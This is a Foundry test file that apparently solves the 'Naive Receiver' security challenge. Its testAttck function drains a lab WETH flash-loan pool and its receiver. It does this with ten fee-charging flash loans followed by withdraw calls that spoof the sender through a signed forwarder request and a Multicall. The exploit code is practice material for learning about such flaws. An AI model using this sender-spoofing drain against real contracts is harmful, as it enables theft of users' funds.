// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool} from "../src/NaiveReceiverPool.sol";
import {WETH} from "@solmate/src/tokens/WETH.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {BasicForwarder} from "../src/BasicForwarder.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {FlashLoanReceiver} from "../src/FlashLoanReceiver.sol";
import {Multicall} from "../src/Multicall.sol";

contract NaiveReceive is Test {
    WETH public weth;
    NaiveReceiverPool public pool;
    FlashLoanReceiver public receiver;
    BasicForwarder public forwarder;

    address feeReceiver = makeAddr("feeReceiver");
    address recoverReceiver = makeAddr("recoverReceiver");

    mapping(address => uint256) public nonces;

    function setUp() public {
        weth = new WETH();
        forwarder = new BasicForwarder();
        pool = new NaiveReceiverPool{value: 1000 ether}(address(forwarder), payable(address(weth)), feeReceiver);
        receiver = new FlashLoanReceiver(address(pool));

        uint256 ethBalance = address(weth).balance;
        uint256 wethBalance = weth.balanceOf(address(pool));

        assertEq(ethBalance, 1000 ether, "ethBalance should be 1000 ether");
        assertEq(wethBalance, 1000 ether, "wethBalance should be 1000 ether");

        weth.deposit{value: 10 ether}();
        weth.transfer(address(receiver), 10 ether);

        uint256 receiverWethBalance = weth.balanceOf(address(receiver));
        assertEq(receiverWethBalance, 10 ether, "receiverWethBalance should be 10 ether");
    }

    function testAttck() public {
        logAdddress();
        (BasicForwarder.Request memory request, bytes memory signature) = privateCreateSignData();
        forwarder.execute{value: request.value}(request, signature);

        uint256 wethRecoverReceiverBalance = weth.balanceOf(recoverReceiver);
        assertEq(wethRecoverReceiverBalance, 1010 ether, "wethRecoverReceiverBalance should be 1010 ether");

        uint256 poolWethBalance = weth.balanceOf(address(pool));
        assertEq(poolWethBalance, 0 ether, "poolWethBalance should be 0 ether");

        uint256 receiverWethBalance = weth.balanceOf(address(receiver));
        assertEq(receiverWethBalance, 0 ether, "receiverWethBalance should be 0 ether");
    }

    function privateCreateSignData() private returns (BasicForwarder.Request memory request, bytes memory signature) {
        (address alice, uint256 alicePk) = makeAddrAndKey("alice");

        bytes[] memory calls = new bytes[](12);

        for (uint256 i = 0; i < 10; i++) {
            calls[i] = abi.encodeWithSelector(
                NaiveReceiverPool.flashLoan.selector, IERC3156FlashBorrower(receiver), address(weth), 0, "0x"
            );
        }

        calls[10] =
            abi.encodeWithSelector(NaiveReceiverPool.withdraw.selector, 10 ether, payable(recoverReceiver), feeReceiver);

        calls[11] = abi.encodeWithSelector(
            NaiveReceiverPool.withdraw.selector, 1000 ether, payable(recoverReceiver), address(this)
        );

        bytes memory encodedCalls = abi.encodeWithSelector(Multicall.multicall.selector, calls);

        request = BasicForwarder.Request({
            from: alice,
            target: address(pool),
            value: 0,
            gas: 1_000_000,
            nonce: nonces[alice]++,
            data: encodedCalls,
            deadline: block.timestamp + 1 days
        });

        bytes32 dataHash = forwarder.getDataHash(request);
        bytes32 domainSeparator = forwarder.domainSeparator();
        bytes32 structHash = keccak256(abi.encodePacked("\x19\x01", domainSeparator, dataHash));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(alicePk, structHash);
        signature = abi.encodePacked(r, s, v);
    }

    function logAdddress() private {
        console.log("--------------------------------");
        console.log("ADDRESS_RECEIVER", address(receiver));
        console.log("ADDRESS_POOL", address(pool));
        console.log("ADDRESS_FORWARDER", address(forwarder));
        console.log("ADDRESS_WETH", address(weth));
        console.log("ADDRESS_FEE_RECEIVER", feeReceiver);
        console.log("ADDRESS_THIS", address(this));
        console.log("ADDRESS_RECOVER_RECEIVER", recoverReceiver);
        console.log("--------------------------------");
    }
}
